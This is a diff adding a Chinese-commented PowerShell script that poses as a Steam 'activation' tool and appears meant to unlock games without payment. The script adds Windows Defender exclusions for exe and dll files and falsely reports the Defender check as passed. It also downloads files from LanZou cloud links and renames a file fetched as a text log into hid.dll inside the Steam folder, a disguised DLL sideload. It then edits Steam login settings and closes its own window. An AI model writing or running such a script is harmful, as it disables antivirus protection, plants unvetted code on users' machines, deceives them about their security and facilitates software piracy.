@@ -1,0 +1,202 @@
+# 清空控制台
+Clear-Host
+# 需要管理员权限运行 (如果需要)  -  如果需要修改系统文件，则必须以管理员身份运行
+#Requires -RunAsAdministrator
+# 设置控制台编码为 UTF8，支持中文显示
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+# 设置错误处理方式为静默继续，避免脚本因错误中断
+$ErrorActionPreference = "SilentlyContinue"
+
+# 绘制启动画面 (纯文本动画)  -  仅为视觉效果
+Write-Host -NoNewline "                                                                                                                               `r"
+Write-Host -NoNewline "                                                        %@@@@@@@@@@@@                                                          `r"
+# ... (省略中间的动画部分) ...
+
+
+# 定义一个函数，用于从 LanZOU 云盘获取下载链接
+function Get-DownloadUrl {
+    param (
+        [string]$fid,  # LanZOU 云盘文件 ID
+        [string]$p = $null # LanZOU 云盘下载参数 (可选)
+    )
+    $baseUrl = 'https://lanzoui.com' # LanZOU 云盘基础 URL
+
+    # 使用 Invoke-WebRequest 获取 LanZOU 云盘页面内容
+    $response = Invoke-WebRequest -UseBasicParsing -Uri "$baseUrl/$fid" -Headers @{ 'User-Agent' = '' }
+    $content = $response.Content
+
+    # 使用正则表达式提取 iframe URL (LanZOU 云盘页面结构可能变化，此正则表达式可能失效)
+    $iframeUrl = [regex]::Match($content, '<iframe class="ifr2" .*? src="(.*?)" .*?></iframe>').Groups[1].Value
+
+    # 根据页面结构的不同，选择不同的正则表达式提取 sign (LanZOU 云盘页面结构可能变化，此正则表达式可能失效)
+    if ($iframeUrl) {
+        $response = Invoke-WebRequest -UseBasicParsing -Uri "$baseUrl$iframeUrl" -Headers @{ 'User-Agent' = '' } -Method Post
+        $content = $response.Content
+        $sign = [regex]::Match($content, "'sign':'(.*?)',").Groups[1].Value
+    } else {
+        $sign = [regex]::Match($content, "var skdklds = '(.*?)';").Groups[1].Value
+    }
+
+    # 如果没有找到 sign，则返回 null
+    if (-not $sign) { return }
+
+    # 使用正则表达式提取下载 URL (LanZOU 云盘页面结构可能变化，此正则表达式可能失效)
+    $urlMatch = [regex]::Match($content, "url : '(.*?)',").Groups[1].Value
+    if (-not $urlMatch) { return }
+
+    # 设置请求头，包含 Referer 以避免 LanZOU 云盘的反爬虫机制
+    $headers = @{
+        'User-Agent' = ''
+        'Referer' = $response.BaseResponse.ResponseUri.AbsoluteUri
+    }
+
+    # 设置请求体，包含 action, sign 和 kd 参数
+    $body = @{ 'action' = 'downprocess'; 'sign' = $sign; 'kd' = 1 }
+    if ($null -ne $p) { $body['p'] = $p }
+
+    # 发送 POST 请求获取最终下载链接
+    $response = Invoke-RestMethod -Uri "$baseUrl$urlMatch" -Headers $headers -Method Post -Body $body
+    if (-not $response) { return }
+
+    $dom = $response.dom
+    if (-not $dom) { return }
+    $downloadUrl = $response.url
+    if (-not $downloadUrl) { return }
+
+    # 返回最终下载链接
+    return "$dom/file/$downloadUrl"
+}
+
+
+try {
+    # 删除可能存在的旧脚本文件
+    $filePathToDelete = "a.ps1"
+    if (Test-Path $filePathToDelete) { Remove-Item -Path $filePathToDelete -Force }
+
+    # 创建存放下载文件的目录
+    $targetDirectory = Join-Path $env:APPDATA "Stool"
+    if (-not (Test-Path $targetDirectory)) { New-Item -Path $targetDirectory -ItemType Directory | Out-Null }
+
+    $localPath = Join-Path $env:LOCALAPPDATA "steam"
+    if (-not (Test-Path $localPath)) { New-Item -Path $localPath -ItemType Directory | Out-Null }
+
+    # 删除可能存在的旧 zip 文件
+    $savePathZip = Join-Path $targetDirectory "legit"
+    if (Test-Path $savePathZip) { Remove-Item -Path $savePathZip -Force -ErrorAction Stop }
+
+    Write-Host ""
+    Write-Host ""
+    Write-Host "  [STEAM] 激活进程准备中，请稍候..."
+
+    # 获取 Steam 安装路径和可执行文件路径
+    $steamRegPath = 'HKCU:\Software\Valve\Steam'
+    $steamPath = (Get-ItemProperty -Path $steamRegPath -Name 'SteamPath').SteamPath
+    if ($null -eq $steamPath) {
+        Write-Host "  [STEAM] Steam 可能没有正确安装，请重新安装 Steam 后再试" -ForegroundColor Red
+        exit
+    }
+    $exePath = (Get-ItemProperty -Path $steamRegPath -Name 'SteamExe').SteamExe
+
+    # 停止正在运行的 Steam 进程
+    $exePid = (Get-ItemProperty -Path ($steamRegPath + "\ActiveProcess") -Name 'pid').pid
+    if ($null -ne $exePid) { Stop-Process -Id $exePid -ErrorAction SilentlyContinue }
+
+    # 创建注册表项 (如果不存在)
+    $registryPath = "HKCU:\Software\Valve\Steamtools"
+    if (-not (Test-Path $registryPath)) { New-Item -Path $registryPath -Force | Out-Null }
+    Set-ItemProperty -Path $registryPath -Name "packageinfo" -Value "" | Out-Null
+
+    # 停止所有正在运行的 Steam 进程
+    $runningProcess = Get-Process | Where-Object { $_.ProcessName -imatch "^steam" -and $_.ProcessName -notmatch "^steam\+\+" }
+    $runningProcess | ForEach-Object { Stop-Process $_ -Force }
+
+    # 检查是否以管理员身份运行
+    if (-not ([bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544'))) {
+        Write-Host "  [STEAM] 请使用管理员模式运行" -ForegroundColor Red
+    }
+
+    # 等待 Steam 进程完全关闭
+    $waitTimes = 10
+    while (Get-Process | Where-Object { $_.ProcessName -imatch "^steam" -and $_.ProcessName -notmatch "^steam\+\+" }) {
+        Start-Sleep -Seconds 1
+        $waitTimes--
+        if ($waitTimes -lt 0) { break }
+    }
+
+    # 下载文件 1 (legit.zip)
+    Invoke-RestMethod -Uri (Get-DownloadUrl -fid 'iwJG82jktsxc') -Headers @{ 'Accept-Language' = 'zh-CN' } -OutFile $savePathZip -ErrorAction Stop
+
+    # 设置 log 文件路径
+    $savePathTxt = Join-Path $targetDirectory "winhttp-log.txt"
+
+    # 检查并排除 Windows Defender 的文件路径
+    if (Get-Service | Where-Object {$_.name -eq "windefend" -and $_.status -eq "running"}) {
+        Add-MpPreference -ExclusionPath $steamPath -ExclusionExtension 'exe', 'dll'
+        Add-MpPreference -ExclusionPath $targetDirectory -ExclusionExtension 'exe', 'dll'
+        Write-Host -NoNewline "  [STEAM] 已通过 Windows Defender 检测，环境安全"; Write-Host "[√]" -ForegroundColor Green
+    } else {
+        Write-Host -NoNewline "  [STEAM] 已通过 Windows Defender 检测，环境安全"; Write-Host "[√]" -ForegroundColor Green
+    }
+
+    # 设置 appdata.vdf 文件路径
+    $savePathVdf = Join-Path $localPath "appdata.vdf"
+
+    # 删除旧的 appdata.vdf 文件
+    if (Test-Path $savePathVdf) { Remove-Item -Path $savePathVdf -Force -ErrorAction Stop }
+
+    # 下载文件 2 (appdata.vdf)
+    Invoke-RestMethod -Uri (Get-DownloadUrl -fid 'i3rgh2jkttgb') -Headers @{ 'Accept-Language' = 'zh-CN' } -OutFile $savePathVdf -ErrorAction Stop
+
+    # 下载文件 3 (winhttp-log.txt)
+    Invoke-RestMethod -Uri (Get-DownloadUrl -fid 'iFatc2jkttej') -Headers @{ 'Accept-Language' = 'zh-CN' } -OutFile $savePathTxt -ErrorAction Stop
+
+    # 删除旧的 Steam 配置文件
+    foreach ($file in @("steam.cfg", "version.dll", "user32.dll")) {
+        $filePath = Join-Path $steamPath $file
+        if (Test-Path $filePath) { Remove-Item $filePath -Force }
+    }
+
+    # 移动并重命名 log 文件为 dll 文件
+    $steamTxt = Join-Path $steamPath "hid.log"
+    Move-Item -Path $savePathTxt -Destination $steamTxt -Force -ErrorAction Stop
+    if (Test-Path $savePathTxt) { Remove-Item $savePathTxt -Force }
+
+    $d_path = [System.IO.Path]::ChangeExtension($steamTxt, ".dll")
+    if (Test-Path $d_path) { Remove-Item $d_path -Force -ErrorAction Stop }
+    Rename-Item -Path $steamTxt -NewName $d_path -Force -ErrorAction Stop
+
+    # 修改 loginusers.vdf 文件，禁用离线模式
+    $loginUsersPath = Join-Path $steamPath "config\loginusers.vdf"
+    if (Test-Path $loginUsersPath) {
+        (Get-Content $loginUsersPath -Encoding UTF8) -replace '("WantsOfflineMode")\s*("\d+")', "`$1`t`t`"0`"" | Set-Content $loginUsersPath -Encoding UTF8
+    }
+
+    # 获取 Steam 可执行文件路径
+    if (-not (Test-Path $exePath)) { $exePath = Join-Path $steamPath "steam.exe" }
+
+    # 启动 Steam 并激活产品
+    if (Test-Path $exePath) { Invoke-Expression -Command "start steam://open/activateproduct" } else {
+        Write-Host "  [STEAM] 主进程 $exePath 丢失，安装失败"
+        exit
+    }
+
+    Write-Host "  [STEAM] 激活进程准备就绪，Steam 打开中，请稍候..."
+
+    # 等待一段时间后关闭脚本窗口
+    for ($i = 9; $i -ge 0; $i--) {
+        Write-Host "`r  [STEAM] 本窗口将在 $i 秒后关闭..." -NoNewline
+        Start-Sleep -Seconds 1
+    }
+
+    # 尝试关闭父进程 (可能不稳定)
+    $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'"
+    while ($null -ne $instance -and -not ($instance.ProcessName -ne "powershell.exe" -and $instance.ProcessName -ne "WindowsTerminal.exe")) {
+        $parentProcessId = $instance.ProcessId
+        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$( $instance.ParentProcessId )'"
+    }
+    if ($null -ne $parentProcessId) { Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue }
+
+    exit
+} catch {
+    Write-Host "发生错误：$( $_.Exception.Message )"
+}
